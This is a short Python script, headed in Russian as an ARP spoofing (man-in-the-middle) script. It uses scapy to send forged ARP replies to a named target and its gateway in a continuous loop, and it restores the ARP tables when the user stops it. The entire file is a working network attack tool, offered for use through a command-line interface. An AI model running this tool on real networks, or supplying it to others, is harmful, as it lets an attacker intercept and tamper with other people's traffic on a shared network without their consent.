# Скрипт для ARP спуффинга (MITM атака)

import argparse
from scapy.all import *
import time


class ARPAttack:
    def __init__(self, target_ip, gateway_ip, target_mac, gateway_mac, interval):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.interval = interval

    def spoof(self):
        packet = ARP(
            op=2, 
            pdst=self.target_ip, 
            hwdst=self.target_mac, 
            psrc=self.gateway_ip
        )
        send(packet, verbose=0)
        packet = ARP(
            op=2, 
            pdst=self.gateway_ip, 
            hwdst=self.gateway_mac, 
            psrc=self.target_ip
        )
        send(packet, verbose=0)

    def run(self):
        try:
            while True:
                self.spoof()
                print("ARP cache poisoning attack sent")
                time.sleep(self.interval)
        except KeyboardInterrupt:
            print("Exiting..")
            self.restore()
            print("ARP tables restored")

    def restore(self):
        packet = ARP(
            op=2, 
            pdst=self.target_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", 
            psrc=self.gateway_ip, 
            hwsrc=self.gateway_mac
        )
        send(packet, verbose=0)
        packet = ARP(
            op=2, 
            pdst=self.gateway_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", 
            psrc=self.target_ip, 
            hwsrc=self.target_mac
        )
        send(packet, verbose=0)


if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description="ARP cache poisoning tool")
    parser.add_argument('target_ip', help="IP address of the target machine")
    parser.add_argument('gateway_ip', help="IP address of the gateway")
    parser.add_argument('target_mac', help="MAC address of the target machine")
    parser.add_argument('gateway_mac', help="MAC address of the gateway")
    parser.add_argument('--interval', type=int, default=2, help="interval between ARP spoofing packets")
    args = parser.parse_args()

    attack = ARPAttack(
        args.target_ip, 
        args.gateway_ip, 
        args.target_mac, 
        args.gateway_mac, 
        args.interval
    )
    attack.run()